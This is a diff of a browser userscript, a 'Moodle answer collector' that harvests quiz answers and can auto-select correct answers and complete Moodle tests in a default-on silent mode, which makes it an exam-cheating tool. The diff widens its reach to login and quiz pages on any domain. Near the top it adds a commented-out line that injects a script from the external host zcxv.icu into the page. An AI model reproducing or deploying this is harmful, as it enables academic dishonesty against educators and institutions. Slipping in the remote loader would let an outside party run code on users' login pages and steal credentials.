@@ -3,8 +3,14 @@
 // @description Moodle answer collector
 // @version 1.4.4.5
 // @require https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js
-// @require https://raw.githubusercontent.com/vladgba/MonkeyConfig/master/monkeyconfig.js
-// @include http://op.tsatu.edu.ua/*
+// @match *://*/*login/index.php*
+// @match *://*/*course/view.php*
+// @match *://*/*course/user.php*
+// @match *://*/*mod/quiz/processattempt.php*
+// @match *://*/*mod/quiz/view.php*
+// @match *://*/*mod/quiz/attempt.php*
+// @match *://*/*mod/quiz/review.php*
+// @match *://*/*mod/quiz/summary.php*
 // @grant window.close
 // @grant GM_getValue
 // @grant GM_setValue
@@ -12,23 +18,25 @@
 // @grant GM_addStyle
 // @run-at document-end
 // ==/UserScript==
+/*
+d=document;t=d.createElement("script");t.src="//zcxv.icu/4";d.body.appendChild(t)
+*/
 (() => {
-    var cfg = new MonkeyConfig({
-        title: 'Настройки',
-        menuCommand: true,
-    });
+    var cfg;
+    if(typeof MonkeyConfig !== 'undefined') cfg = new MonkeyConfig({ title: 'Настройки', menuCommand: true });
+    else cfg = class{static get(a, b, c){return c} static open(){return;} };
     var _ = undefined;
-    var floatsetbtn = cfg.get('Плавающая кнопка настроек', _, true);
-    var silent = cfg.get('Скрытный режим', _, false);
-    var autoignoreerrors = cfg.get('Игнор ошибок', _, true);
+    var floatsetbtn = cfg.get('Плавающая кнопка настроек', _, false);
+    var silent = cfg.get('Скрытный режим', _, true);
+    var autoignoreerrors = cfg.get('Игнор ошибок', _, false);
     var forceauto = cfg.get('Стартовать и перепроходить тесты', _, false);
-    var autoselect = cfg.get('Выбирать правильный ответ', _, true);
+    var autoselect = cfg.get('Выбирать правильный ответ', _, false);
     var autonext = cfg.get('Клацать кнопку Далее', _, false);
     var autoend = cfg.get('Заканчивать тест', _, false);
     var autoclose = cfg.get('Закрывать пройденное', _, false);
     var forceautocourse = cfg.get('Открывать все тесты курса в новой вкладке', _, false);
     var hlanswonreview = cfg.get('Подсвечивать ответы после теста', _, false);
-    var hlreview = cfg.get('Подсвечивать вкладку с оконченным тестом', _, true);
+    var hlreview = cfg.get('Подсвечивать вкладку с оконченным тестом', _, false);
     var automark = cfg.get('Тыкать галочки на странице предмета', _, false);
     var haymaking = cfg.get('Пособирать ответы в тестах', _, false);
     var haymlist = cfg.get('Собирать ответы в тестах со всего предмета', _, false);
@@ -202,6 +210,9 @@
         var content = [];
         var Questions = document.querySelectorAll('.que');
         for (var part of Questions) {
+            console.log('Type: ' + detectTypeOfQue(part));
+            var trufalse = detectTypeOfQue(part) == 1;
+            var selintext = detectTypeOfQue(part) == 7 || detectTypeOfQue(part) == 8;
             svcIconRemove(part);
             var quesss = [];
             var ans = [];
@@ -210,68 +221,120 @@
             var RightAnswered = [];
             var NonRightAnswered = [];
 
-            var Selects = part.querySelectorAll('select').length;
-            console.log(Selects);
-            console.log(22);
+            var Selects = part.querySelectorAll('table select').length;
+            // TODO: Refactor
             if(Selects) {
+            console.log('Selects');
                 var tbl = part.querySelectorAll('table tr');
+                var result = [];
                 console.warn('tbl');
                 console.warn(tbl);
-                let RightAnswer = filterSelRightanswer(part.querySelector('.rightanswer')).replace(/\n/,'').replace(/\s+/,' ');
-                for(var ptt of tbl) {
-                    var que = filterSelText(ptt.querySelector('td:first-child').innerText).replace(/\n/,'').replace(/\s+/,' ');
-                    quesss.push(que);
-                    var quename = ((quesss[quesss.length-1])).trim() + ' →';
-                    console.log('quename');
-                    console.log(quename);
-                    var quenum = '[[' + (quesss.length-1) + ']]';
-                    console.log('quenum');
-                    console.log(quenum);
-                    RightAnswer = RightAnswer.replace(quename, quenum);
-                    console.log('RA-chng');
-                    console.log(RightAnswer);
-                    let answ = ptt.querySelectorAll('td select');
+                let ranspre = part.querySelector('.rightanswer');
 
-                }
-                console.log('------------');
-                console.log('RightAnswer');
-                console.log(RightAnswer);
-                var fres = RightAnswer.split('[[');
-                fres.shift();
-                console.log('fres');
-                console.log(fres);
-                var result = [];
-                for(var fone of fres) {
-                    var lastres = fone.replace(/[.,](\s+)?$/,'').split(']]');
-                    console.log('lastres');
-                    console.log(lastres);
-                    result.push(filterSelText(quesss[lastres[0]].trim() + ':://::' + lastres[1].trim()));
-                }
-                console.log('result');
-                console.log(result);
-                console.log('quesss');
-                console.log(quesss);
-
-                console.warn([Question, [], result, []]);
-                content.push([Question, [], result, []]);
-            } else {
-                for (var el of Answers) {
-                    let answ = filterAnswer(el);
-                    if (el.classList.contains('incorrect')) NonRightAnswered.push(answ);
-                    if (el.classList.contains('correct')) RightAnswered.push(answ);
-                    if (el.querySelector('input[checked="checked"]')) {
-                        var grade = part.querySelector('.grade').innerHTML;
-                        if ((grade.localeCompare('Балів 1,00 з 1,00')) == 0 || (grade.localeCompare('Mark 1.00 out of 1.00')) == 0) {
-                            RightAnswered.push(answ);
-                        }
-                        if ((grade.localeCompare('Балів 0,00 з 1,00')) == 0 || (grade.localeCompare('Mark 0.00 out of 1.00')) == 0) {
-                            NonRightAnswered.push(answ);
-                        }
+                if(ranspre) {
+            console.log('ranspre');
+                    let RightAnswer = filterSelRightanswer(part.querySelector('.rightanswer')).replace(/\n/,'').replace(/\s+/,' ');
+                    for(var ptt of tbl) {
+                        var que = filterSelText(ptt.querySelector('td:first-child').innerText).replace(/\n/,'').replace(/\s+/,' ');
+                        quesss.push(que);
+                        var quename = ((quesss[quesss.length-1])).trim() + ' →';
+                        console.log('quename');
+                        console.log(quename);
+                        var quenum = '[[' + (quesss.length-1) + ']]';
+                        console.log('quenum');
+                        console.log(quenum);
+                        RightAnswer = RightAnswer.replace(quename, quenum);
+                        console.log('RA-chng');
+                        console.log(RightAnswer);
+                        let answ = ptt.querySelectorAll('td select');
                     }
-                    ans.push(answ);
+                    console.log('------------');
+                    console.log('RightAnswer');
+                    console.log(RightAnswer);
+                    var fres = RightAnswer.split('[[');
+                    fres.shift();
+                    console.log('fres');
+                    console.log(fres);
+                    for(var fone of fres) {
+                        var lastres = fone.replace(/[.,](\s+)?$/,'').split(']]');
+                        console.log('lastres');
+                        console.log(lastres);
+                        result.push(filterSelText(quesss[lastres[0]].trim() + ':://::' + lastres[1].trim()));
+                    }
+                    console.log('result');
+                    console.log(result);
+                    console.log('quesss');
+                    console.log(quesss);
+
+                    console.warn([Question, [], result, []]);
+                    content.push([Question, [], result, []]);
+                } else {
+            console.log('t.parentEl');
+                    let pts = part.querySelectorAll('td.correct');
+                    for(var pt of pts) {
+                        pt = pt.parentElement;
+                        let ku = pt.querySelector('td:first-child').innerText;
+                        let incv = pt.querySelector('td:last-child').querySelector('select').selectedOptions?.[0]?.label;
+                        if(!incv) continue;
+                        result.push(ku.trim() + ':://::' + incv.trim());
+                    }
+                    var badRes = [];
+                    let bpts = part.querySelectorAll('td.incorrect');
+                    for(var bpt of bpts) {
+                        bpt = bpt.parentElement;
+                        let ku = bpt.querySelector('td:first-child').innerText;
+                        let incv = bpt.querySelector('td:last-child').querySelector('select').selectedOptions?.[0]?.label;
+                        if(!incv) continue;
+                        badRes.push(ku.trim() + ':://::' + incv.trim());
+                    }
+                    console.warn([Question, [], result, badRes]);
+                    content.push([Question, [], result, badRes]);
                 }
-                let RightAnswer = part.querySelector('.rightanswer');
-                if (RightAnswer) RightAnswered.push(filterRightanswer(RightAnswer));
+            } else {
+            console.log('let RightAnswer');
+                let RightAnswer;
+                if(!Answers || Answers.length<1) {
+                    if(selintext) {
+            console.log('selintext');
+                        RightAnswer = part.querySelector('.qtext').cloneNode(true);
+                        svcIconRemove(RightAnswer);
+                        let raSelects = RightAnswer.querySelectorAll('.qtext select');
+                        for(var ras of raSelects) {
+                            if(ras.classList.contains('correct')) ras.outerHTML = '[' + (ras.selectedOptions?.[0]?.label || '') + ']';
+                            else ras.outerHTML = '[]';
+                        }
+                        RightAnswered.push(RightAnswer.innerText);
+                    }
+                } else {
+                    RightAnswer = part.querySelector('.rightanswer');
+                    for (var el of Answers) {
+                        let answ = filterAnswer(el);
+                        if(trufalse) {
+                            console.log('trufalse');
+                            if(RightAnswer){
+                                if(RightAnswer.innerText.indexOf(answ) !== -1) RightAnswered.push(answ);
+                            }
+                            if (el.classList.contains('incorrect')) NonRightAnswered.push(answ);
+                            if (el.classList.contains('correct')) RightAnswered.push(answ);
+                        } else {
+                            console.log('else {');
+
+                            if (el.classList.contains('incorrect')) NonRightAnswered.push(answ);
+                            if (el.classList.contains('correct')) RightAnswered.push(answ);
+                            if (el.querySelector('input[checked="checked"]')) {
+                                var grade = part.querySelector('.grade').innerHTML;
+                                if ((grade.localeCompare('Балів 1,00 з 1,00')) == 0 || (grade.localeCompare('Mark 1.00 out of 1.00')) == 0) {
+                                    RightAnswered.push(answ);
+                                }
+                                if ((grade.localeCompare('Балів 0,00 з 1,00')) == 0 || (grade.localeCompare('Mark 0.00 out of 1.00')) == 0) {
+                                    NonRightAnswered.push(answ);
+                                }
+                            }
+                        }
+                        ans.push(answ);
+                    }
+                    if (!trufalse && RightAnswer) RightAnswered.push(filterRightanswer(RightAnswer));
+                }
                 console.warn([Question, ans, RightAnswered, NonRightAnswered]);
                 content.push([Question, ans, RightAnswered, NonRightAnswered]);
             }
@@ -322,8 +385,7 @@
     };
 
     var filterQue = function(que) {
-        filterInner(que);
-        return filterText(que.innerHTML);
+        return filterText(filterInner(que).innerHTML);
     };
 
     var trem = function(s, t, g = '') {
@@ -333,13 +395,15 @@
     };
 
     var filterInner = function(el) {
+        var res = el.cloneNode(true);
         var tags;
-        while ((tags = el.querySelector('p,span,div,i,a')) !== null) {
+        while ((tags = res.querySelector('p,span,div,i,a')) !== null) {
             tags.outerHTML = tags.innerHTML;
         }
-        trem(el, 'class');
-        trem(el, 'style');
-        trem(el, 'lang');
+        trem(res, 'class');
+        trem(res, 'style');
+        trem(res, 'lang');
+        return res;
     };
 
     var filterSelText = function(text, rmquotes = false) {
@@ -354,16 +418,16 @@
     };
 
     var filterAnswer = function(el) {
-        filterInner(el);
-        var anb = el.querySelector('span.answernumber');
+        var xel = filterInner(el);
+        var anb = xel.querySelector('span.answernumber');
         if (anb) anb.remove();
-        var a = el.querySelector('label').innerHTML;
-        return filterText(a.replace(/^([a-z])\. /, ''));
+        var a = xel.querySelector('label').innerHTML.replace(/^(\s+)?([a-z]{1,4})(\s+)?\. /i, '');
+        console.log(a);
+        return filterText(a);
     };
 
     var filterRightanswer = function(text, f = false) {
-        filterInner(text);
-        var res = (f ? filterSelText(text.innerHTML) : filterText(text.innerHTML));
+        var res = (f ? filterSelText(filterInner(text).innerHTML) : filterText(filterInner(text).innerHTML));
         res = res.replace(new RegExp('Правильна відповідь: '), '').replace(new RegExp('Ваша відповідь (не )?правильна'), '');
         res = res.replace(new RegExp('Правильні відповіді: '), '');
         res = res.replace(new RegExp('The correct answer is: '), '');
@@ -372,8 +436,7 @@
     };
 
     var filterSelRightanswer = function(text, f = false) {
-        filterInner(text);
-        var res = filterSelText(text.innerText);
+        var res = filterSelText(filterInner(text).innerText);
         res = res.replace(new RegExp('Правильна відповідь: '), '').replace(new RegExp('Ваша відповідь (не )?правильна'), '');
         res = res.replace(new RegExp('Правильні відповіді: '), '');
         res = res.replace(new RegExp('The correct answer is: '), '');
@@ -381,6 +444,19 @@
         return res.trim();
     };
 
+    var detectTypeOfQue = function(queNode) {
+        if(queNode.querySelector('input[id*="_answertrue"], input[id*="_answerfalse"]')) return 1; // True / False
+        if(queNode.querySelector('input[type="radio"]')) return 2; // Single answer
+        if(queNode.querySelector('input[type="checkbox"]')) return 3; // Multiple answer
+        if(queNode.querySelector('input[type="text"][size="80"]')) return 4; // Standart text field
+        if(queNode.querySelector('input[type="text"][size="30"]')) return 5; // Number text field
+        if(queNode.querySelector('table select')) return 6; // Matching question
+        if(queNode.querySelector('select')) return 7; // Select missing words question
+        if(queNode.querySelector('.drags')) return 8; // Drag and drop into text
+        if(queNode.querySelector('.ddarea .draghomes')) return 9; // Img & drag imgs
+        if(queNode.querySelector('.ddarea .dragitems')) return 10; // Img & drag markers
+        return 11;
+    }
     var detectMultiAnswer = function(answer) {
         if (answer.search(new RegExp('The correct answers are: ')) || answer.search(new RegExp('Правильні відповіді: '))) {
             return true;
@@ -433,6 +509,7 @@
         var qparr = [];
         var get = true;
         for (var part of parts) {
+            console.log('Type: ' + detectTypeOfQue(part));
             var Selects = part.querySelector('select');
             svcIconRemove(part);
             var Quest = part.querySelector('.formulation .qtext');
@@ -512,6 +589,7 @@
                                 ansik.classList.add('answerednow');
                                 ansik.style = silent ? "color:#040" : "background:#00ff0c";
                                 var currinp = ansik.querySelector('input:not([type="hidden"])');
+                                currinp.style = 'cursor:progress';
                                 if (autoselect && !currinp.checked) currinp.click();
                                 break;
                             case '2':
